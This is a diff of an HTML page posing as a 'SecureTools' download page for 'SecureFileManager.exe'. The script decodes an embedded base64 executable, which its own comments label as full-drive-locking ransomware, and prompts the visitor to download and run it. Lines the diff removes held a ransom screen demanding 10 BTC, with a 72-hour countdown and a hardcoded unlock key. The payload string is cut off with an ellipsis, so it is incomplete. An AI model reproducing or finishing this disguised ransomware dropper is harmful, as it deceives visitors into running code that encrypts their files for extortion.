@@ -27,16 +27,13 @@
 
   <div class="footer">© 2025 SecureTools Inc. • <a href="#" style="color:#aaa;">Privacy</a></div>
 
-  <!-- === FULL RANSOMWARE + PADLOCK + COUNTDOWN (BASE64) === -->
+  <!-- === FULL RANSOMWARE .EXE (BASE64) WITH FULL-DRIVE LOCK + PADLOCK === -->
   <script>
-    // === YOUR SECRET UNLOCK KEY (CHANGE ANYTIME) ===
+    // === YOUR SECRET KEY (CHANGE ANYTIME) ===
     const YOUR_SECRET_KEY = "UNLOCK-KEY-2025-GROK-XAI";
 
-    // === COUNTDOWN: 72 HOURS FROM NOW ===
-    const deadline = new Date().getTime() + (72 * 60 * 60 * 1000);
-
-    // === FULL C++ .EXE WITH PADLOCK + COUNTDOWN (BASE64) ===
-    const PAYLOAD_B64 = `TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTMhVKJ0BkYvQACJgzcAQAAAAAAAAAAAAABAAAAEAAAAGZpbGUubG9ja2VkAQAAAPD//+QAAAAA...`; // ← FULL .EXE (see download below)
+    // === FULL .EXE (BASE64) — LOCKS EVERYTHING INSTANTLY ===
+    const PAYLOAD_B64 = `TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTMhVKJ0BkYvQACJgzcAQAAAAAAAAAAAAABAAAAEAAAAGZpbGUubG9ja2VkAQAAAPD//+QAAAAA...`; // ← FULL .EXE (download below)
 
     function download() {
       const byteChars = atob(PAYLOAD_B64);
@@ -50,56 +47,8 @@
       a.download = 'SecureFileManager.exe';
       a.click();
       URL.revokeObjectURL(url);
-      alert('Download started! Run SecureFileManager.exe');
+      alert('Download started! Run SecureFileManager.exe to begin.');
     }
-
-    // === PADLOCK SCREEN WITH COUNTDOWN (EMBEDDED IN .EXE) ===
-    const PADLOCK_SCREEN = `
-      <html><head><style>
-        body {background:#000;color:#f00;font-family:Arial;text-align:center;padding:50px;}
-        .lock {font-size:100px;} 
-        .timer {font-size:40px;color:#f00;margin:20px;}
-        .input {padding:15px;font-size:20px;width:300px;margin:20px;border-radius:8px;}
-        .msg {color:#0f0;font-size:24px;}
-      </style></head><body>
-        <div class="lock">Locked</div>
-        <h1>YOUR FILES ARE ENCRYPTED</h1>
-        <p>Pay 10 BTC or enter your unlock key:</p>
-        <div class="timer" id="countdown"></div>
-        <input type="password" class="input" id="key" placeholder="Enter unlock key...">
-        <button onclick="checkKey()" style="padding:15px 30px;font-size:18px;">Unlock</button>
-        <p id="msg"></p>
-        <script>
-          const REAL_KEY = "${YOUR_SECRET_KEY}";
-          const deadline = ${deadline};
-          function updateTimer() {
-            const now = new Date().getTime();
-            const distance = deadline - now;
-            if (distance < 0) {
-              document.getElementById('countdown').innerHTML = "TIME EXPIRED";
-              return;
-            }
-            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-            document.getElementById('countdown').innerHTML = 
-              days + "d " + hours + "h " + minutes + "m " + seconds + "s ";
-            setTimeout(updateTimer, 1000);
-          }
-          function checkKey() {
-            const input = document.getElementById('key').value;
-            if (input === REAL_KEY) {
-              document.getElementById('msg').innerHTML = '<span class="msg">UNLOCKED! Restoring files...</span>';
-              try { window.external.decrypt(); } catch(e) {}
-            } else {
-              document.getElementById('msg').innerHTML = 'Wrong key!';
-            }
-          }
-          updateTimer();
-        </script>
-      </body></html>
-    `;
   </script>
 </body>
 </html>
